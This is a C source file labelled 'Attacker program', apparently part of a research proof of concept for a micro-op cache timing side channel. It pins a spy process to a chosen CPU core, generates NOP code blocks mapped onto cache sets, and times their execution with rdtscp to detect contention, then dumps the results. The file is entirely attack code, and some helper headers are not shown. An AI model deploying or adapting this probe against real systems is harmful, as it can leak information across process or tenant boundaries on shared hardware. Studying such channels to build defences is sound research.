/**
 * Attacker program
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/types.h>


#include "../utils.h"
#include "../global.h"
#include "./codegen.h"

/* Probing iteration */
#define LEN_RESULT          200
#define LEN_WARMUP          5
// #define BUSY_CYCLE          20

/**
 * Core part of the Attack: probing a set
 */
static void __attribute__ ((noinline)) probe(int (*func)(void), struct Regs *re) {
    __asm__ __volatile__(
            "lfence; rdtscp; lfence                   \n"
            : "=a" (re->_eax1), "=d" (re->_edx1) : : );
    
    func(); func(); func(); func();
    
    __asm__ __volatile__(
            "lfence; rdtscp; lfence                   \n"
            : "=a" (re->_eax2), "=d" (re->_edx2) : : );
    
    return;
}

/**
 * Total attack flow here
 */
static void uop_check(struct prog_context_t *ctx_attack, struct Regs **result){
    int (*func)(void);

    int s, i;
    for (s = 0; s < UOP_SET; s++) { 
        func = (void *)ctx_attack->start[s];

        /* Probe iteratively */
        for (i = 0; i < LEN_RESULT; i++) {
            probe(func, &result[s][i]);
            
            /* Several ways to give a padding            */
            //busy_wait(BUSY_CYCLE);
            //NOP64
            //NOP32
            NOP16
        }
    }
}

/**
 * Main
 */
int main(int argc, char **argv) {
    struct prog_context_t *for_attack;
    struct Regs **result;
    int s, i;
    
    /* Setup */
    startup_setting();
    
    /* Pin attacker */
    if (!pin_cpu(ATTACKER_CORE)) {
        fprintf(stdout, "[Error] pinning the spy process failed\n");
        goto ret;
    }

    /* Prepare uops for attack */
    fprintf(stdout, "[Log] prepare uops\n");
    for_attack = (struct prog_context_t *)malloc(sizeof(struct prog_context_t));

    for_attack->chunk_type = NOP_9_CHUNK;
    for_attack->code_chunk_size = CODE_CHUNK_SIZE_64;
    for_attack->code_block_num_chunks = UOP_SET * UOP_ASSOC;
    for_attack->num_set = UOP_SET;
    if(init_code_block(for_attack, SET_WISE_ON) != 0)
        goto ret;
    dump_code_block(for_attack, "attack\n");
    
    // Result buffer 
    result = (struct Regs **)malloc(UOP_SET * sizeof(struct Regs *));
    for (s = 0; s < UOP_SET; s++) {
        result[s] = (struct Regs *)malloc(LEN_RESULT * sizeof(struct Regs));
        memset((void *)result[s], 0, (LEN_RESULT * sizeof(struct Regs)));
    }

    /* Attack begin */
    fprintf(stdout, "[Log] attack begin\n");
    uop_check(for_attack, result);
    fprintf(stdout, "[Log] attack finishes\n");

    /* Dump the result */
    dump_result(result, LEN_RESULT, LEN_WARMUP);

ret: 
    /* Clean-up */
    for (s = 0; s < UOP_SET; s++)
        free(result[s]); 
    free(result);
    cleanup_code_block(for_attack);

    return 0;
}

